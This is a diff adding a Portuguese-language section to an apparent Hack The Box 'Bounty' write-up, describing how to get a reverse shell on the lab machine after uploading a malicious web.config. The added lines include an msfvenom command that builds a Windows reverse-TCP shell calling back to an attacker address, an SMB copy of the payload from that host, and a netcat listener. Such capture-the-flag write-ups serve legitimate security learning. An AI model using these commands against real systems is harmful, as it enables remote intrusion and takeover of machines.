@@ -2608,6 +2608,7 @@ https://gist.github.com/gazcbm/ea7206fbbad83f62080e0bbbeda77d9c
 
 https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/
 
+## Reverse Shell
 
 webshell  
 
@@ -2727,4 +2728,35 @@ Network Card(s):           1 NIC(s) Installed.
                                  IP address(es)
                                  [01]: 10.10.10.93
 ```
+
+Depois de fazer o upload do nosso `web.config` malicioso, acessamos nossa web shell e transferimos nosso reverse64.exe gerado pelo msfvenom..
+
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.37 LPORT=53 -f exe -o reverse64.exe`
+
+Ative o smbserver do impacket e execute em sua webshell
+
+`copy \\10.10.14.37\tools\reverse64.exe c:\windows\temp\`
+
+![8.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bounty/8.jpg)
+
+
+apos isso, confirme se realmente o arquivo encontra-se la...
+
+
+`dir c:\windows\temp\`
+
+![9.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bounty/9.jpg)
+
+
+lembre-se o arquivo web.config eh deletado depois de alguns minutos, entao eh necessario fazer o upload novamente,,,,,
+
+ative o listen e execute o payload gerado e salvo no temp..
+
+`nc -nlvp 53`
+
+Execute
+
+`c:\windows\temp\.\reverse64.exe`
+
+![10.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bounty/10.jpg)
 
